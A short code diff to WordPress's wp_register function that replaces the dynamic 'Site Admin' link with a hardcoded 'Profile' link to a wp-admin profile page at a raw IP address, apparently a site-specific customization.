@@ -384,7 +384,7 @@ function wp_register( $before = '<li>', $after = '</li>', $echo = true ) {
 		else
 			$link = '';
 	} else {
-		$link = $before . '<a href="' . admin_url() . '">' . __('Site Admin') . '</a>' . $after;
+		$link = $before . '<a href="http://183.110.207.46/wp/wp-admin/profile.php">' . __('Profile') . '</a>' . $after;
 	}
 
 	if ( $echo )
